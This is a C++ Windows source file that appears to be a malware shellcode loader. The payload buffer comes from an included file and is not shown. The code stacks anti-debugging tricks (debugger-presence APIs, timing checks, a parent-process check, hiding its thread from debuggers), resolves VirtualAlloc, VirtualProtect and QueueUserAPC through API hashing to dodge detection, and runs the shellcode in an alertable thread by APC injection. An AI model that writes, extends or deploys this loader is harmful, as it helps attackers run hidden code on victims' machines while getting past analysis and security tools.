#include <Windows.h>
#include <stdio.h>
#include <tchar.h>
#include <timeapi.h>

#include "base.cpp"

/*
    All The Anti-Debugging Techniques I Implemented Off the Rip.
    They all return true if the process is being debugged, false if not.
*/

// Function to check if the process is being debugged using IsDebuggerPresent.
bool static isDebuggerPresentBasic() {
    return IsDebuggerPresent();
}

// -----------------------------------------------------------------------------------------------


// Function to check if the process is being debugged by another process using CheckRemoteDebuggerPresent.
bool static isDebuggerPresentRemote() {
    BOOL bDebuggerPresent = FALSE;
    return (CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebuggerPresent) && bDebuggerPresent);
}

// -----------------------------------------------------------------------------------------------

// Function to check if the process is being debugged by another process using a variety of time heuristics.

bool static IsDebuggedTimeHeuristics(unsigned __int64 qwNativeElapsed, DWORD dwNativeElapsedTick, DWORD64 qwNativeElapsedQuery) {
    SYSTEMTIME stStart, stEnd;
    FILETIME ftStart, ftEnd;
    ULARGE_INTEGER uiStart, uiEnd;
    LARGE_INTEGER liStart, liEnd;

    // GetSystemTime method detection
    GetSystemTime(&stStart);
    
    // Simulate work by sleeping
    Sleep(200);

    GetSystemTime(&stEnd);

    if (!SystemTimeToFileTime(&stStart, &ftStart)) {
        return false;
    }
    if (!SystemTimeToFileTime(&stEnd, &ftEnd)) {
        return false;
    }

    uiStart.LowPart = ftStart.dwLowDateTime;
    uiStart.HighPart = ftStart.dwHighDateTime;
    uiEnd.LowPart = ftEnd.dwLowDateTime;
    uiEnd.HighPart = ftEnd.dwHighDateTime;

    if ((ULONGLONG)(uiEnd.QuadPart - uiStart.QuadPart) > qwNativeElapsed) return true;

    // GetTickCount64 method detection.
    ULONGLONG dwStartTick = GetTickCount64();

    // Simulate work by sleeping
    Sleep(200);

    if ((GetTickCount64() - dwStartTick) > dwNativeElapsedTick) return true;

    // QueryPerformanceCounter method detection.
    QueryPerformanceCounter(&liStart);
    
    // Simulate work by sleeping
    Sleep(200);
    
    QueryPerformanceCounter(&liEnd);
    if ((ULONGLONG)(liEnd.QuadPart - liStart.QuadPart) > qwNativeElapsedQuery) return true;

    return false;
}

// -----------------------------------------------------------------------------------------------

#define NtCurrentThread ((HANDLE)-2)  // Define NtCurrentThread as the current thread handle.

// Define the function prototype for NtSetInformationThread from ntdll.dll.
typedef NTSTATUS (NTAPI* pNtSetInformationThread)(
    HANDLE ThreadHandle, 
    _THREAD_INFORMATION_CLASS ThreadInformationClass,
    PVOID ThreadInformation, 
    ULONG ThreadInformationLength
);

// Function to hide the current thread from the debugger.
bool static HideThreadFromDebugger() {
    // Load ntdll.dll dynamically.
    HMODULE hNtDll = GetModuleHandle(_T("ntdll.dll"));
    if (hNtDll == NULL) return false;

    // Get the address of the NtSetInformationThread function.
    pNtSetInformationThread NtSetInformationThread = 
        (pNtSetInformationThread)GetProcAddress(hNtDll, "NtSetInformationThread");
    if (NtSetInformationThread == NULL) return false;

    NTSTATUS status = NtSetInformationThread(
        NtCurrentThread, 
        (THREAD_INFORMATION_CLASS)0x11, 
        NULL, 
        0);
    return status >= 0;
}

// -----------------------------------------------------------------------------------------------

// Advanced anti-debugging check using NtQueryInformationProcess to detect a debugger.
bool static isDebuggerPresentNtQuery() {
    typedef struct _PROCESS_BASIC_INFORMATION {
        ULONG Reserved;
        ULONG PebBaseAddress;
        ULONG AffinityMask;
        ULONG BasePriority;
        ULONG UniqueProcessId;
        ULONG InheritedFromUniqueProcessId;
    } PROCESS_BASIC_INFORMATION;
    
    typedef enum _PROCESSINFOCLASS {
        ProcessBasicInformation = 0  // Enum value for ProcessBasicInformation.
    } PROCESSINFOCLASS;

    // Define the function prototype for NtQueryInformationProcess.
    typedef NTSTATUS(WINAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    
    // Get the address of NtQueryInformationProcess from ntdll.dll.
    HMODULE nHandle = GetModuleHandle(L"ntdll.dll");
    if (nHandle == 0) return false;

    pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(nHandle, "NtQueryInformationProcess");
    if (NtQueryInformationProcess == NULL) {
        return false;
    }
  
    PROCESS_BASIC_INFORMATION pbi;
    ULONG len = 0;
    NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), &len);
    if (status != 0) return false;

    // Check if the process is running under a debugger by examining the inherited process ID.
    // Return true if the inherited process ID is non-zero (indicating a debugger).
    return pbi.InheritedFromUniqueProcessId != 0;
}

// -----------------------------------------------------------------------------------------------

bool static AntiDebug() {

    // Set the thresholds for each detection method
    unsigned __int64 qwNativeElapsed = 5000000; // 5 seconds in 100-nanosecond intervals
    DWORD dwNativeElapsedTick = 1000;    // Threshold for GetTickCount/timeGetTime in milliseconds
    unsigned __int64 qwNativeElapsedQuery = 5000000; // Threshold for QueryPerformanceCounter in high-resolution intervals

    // Check for debugger presence using a variety of time heuristics.
    if (IsDebuggedTimeHeuristics(qwNativeElapsed, dwNativeElapsedTick, qwNativeElapsedQuery)) {
        exit(-1); // If the delay indicates a debugger, exit the application.
    }

    // Check for basic debugger presence using IsDebuggerPresent function.
    if (isDebuggerPresentBasic()) {
        exit(-1);  // If a debugger is detected, exit the application.
    }

    // Check for remote debugger presence using CheckRemoteDebuggerPresent function.
    if (isDebuggerPresentRemote()) {
        exit(-1);  // If a remote debugger is detected, exit the application.
    }

    // Check for debugger presence using NtQueryInformationProcess function.
    if (isDebuggerPresentNtQuery()) {
        exit(-1);  // If a debugger is detected, exit the application.
    }

    // Hide the current thread from the debugger using NtSetInformationThread.
    if (!HideThreadFromDebugger()) {
        return false;
    }

    return true;  // Return true if no debugger is detected and thread is hidden.
}


/*

    Structural Code Necessary for Runtime

*/


/*

    Pre-computed FNV-1a hashes for the required APIs:
        - VirtualAlloc
        - VirtualProtect
        - QueueUserAPC

*/

// VirtualAlloc
#define VIRTUALALLOC_HASH 0x3285501

// VirtualProtect
#define VIRTUALPROTECT_HASH 0x820621F3

// QueueUserAPC
#define QUEUEUSERAPC_HASH 0x890BB4FB

// Define FNV-1a (Fowler-Noll-Vo) hashing function for API hashing.
unsigned int hash_api(const char* str) {
    // Initialize the hash value with the FNV offset basis (2166136261).
    unsigned int hash = 2166136261U;
    
    // Loop through each character of the string until the null terminator.
    while (*str) {
        // XOR the current character with the hash value.
        hash ^= (unsigned int)(*str++);
        
        // Multiply the hash value by the FNV prime (16777619).
        // This helps to spread out the hash values and reduce collisions.
        hash *= 16777619;
    }

    return hash;
}

DWORD WINAPI AlertableThreadFunction(LPVOID lpParam) {
    // Create two event objects with initial non-signaled state (FALSE)
    HANDLE x = CreateEvent(NULL, FALSE, FALSE, NULL);
    HANDLE y = CreateEvent(NULL, FALSE, FALSE, NULL);

    // Ensure both events were created successfully
    if (x && y) {
        // Wait for x to be signaled, then signal y
        // The TRUE parameter indicates automatic reset for y after signaling
        SignalObjectAndWait(x, y, INFINITE, TRUE);

        // Close event handles after use
        CloseHandle(x);
        CloseHandle(y);
    }

    return 0;
}


// Dynamically resolve WinAPI functions via hashes from the export table.
FARPROC ResolveFunctionByHash(HMODULE hModule, unsigned int apiHash) {
    // Retrieve the DOS header of the module to access the NT headers
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);

    // Retrieve the export directory from the NT headers
    IMAGE_EXPORT_DIRECTORY* exportDirectory = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule +
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    // Get the RVAs for names, functions, and ordinals
    DWORD* nameRVA = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);
    DWORD* functionRVA = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
    WORD* ordinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);

    // Loop through all function names in the export table
    for (unsigned int i = 0; i < exportDirectory->NumberOfNames; i++) {
        // Get the function name from the RVA
        const char* functionName = (const char*)((BYTE*)hModule + nameRVA[i]);

        // Compare the hash of the function name to the given apiHash
        if (hash_api(functionName) == apiHash) {
            // If a match is found, return the function's address
            return (FARPROC)((BYTE*)hModule + functionRVA[ordinals[i]]);
        }
    }

    return nullptr;
}


// Queue the payload to run using APC, aka APC-Injection
int QueueViaAPC(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
    // Define standard variable stubs.

    // Grab a module handle for kernel32.dll.
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");

    // Redeclare the WinAPI functions as stubs.
    typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
    typedef DWORD(WINAPI* QueueUserAPC_t)(PAPCFUNC, HANDLE, ULONG_PTR);

    // Redefine the WinAPI functions using the pre-computed hashes.
    VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t)ResolveFunctionByHash(kernel32, VIRTUALALLOC_HASH);
    VirtualProtect_t pVirtualProtect = (VirtualProtect_t)ResolveFunctionByHash(kernel32, VIRTUALPROTECT_HASH);
    QueueUserAPC_t pQueueUserAPC = (QueueUserAPC_t)ResolveFunctionByHash(kernel32, QUEUEUSERAPC_HASH);

    // Return if the necessary WinAPI calls failed to resolve from stubs.
    if (!pVirtualAlloc || !pVirtualProtect || !pQueueUserAPC) return 1;
        
    // Allocate memory for the payload.
    PVOID pAddress = pVirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) return 1;

    // Write the shellcode to to the allocated memory.
    memcpy(pAddress, pPayload, sPayloadSize);

    // Check and define protected virtual memory.
    DWORD dwOldProtection = 0;
    if (!pVirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) return 1;

    // Queue the user via APC.
    if (!pQueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) return 1;

    return 0;
}

// Execution Runtime
int main() {

    // Call the AntiDebug function to check for debugging attempts.
    if (!AntiDebug()) {
        return -1;
    }

    // Define standard variable stubs.
    HANDLE hThread = NULL;
    DWORD dwThreadId = NULL;

    // Create the thread running "an alertable function", wowie.
    hThread = CreateThread(NULL, NULL, &AlertableThreadFunction, NULL, NULL, &dwThreadId);
    if (hThread == NULL) return 1;
        
    // Call APC Injection runtime.
    if (QueueViaAPC(hThread, buf, sizeof(buf)) != 0) return 1;

    // Wait for the thread to alert.
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}
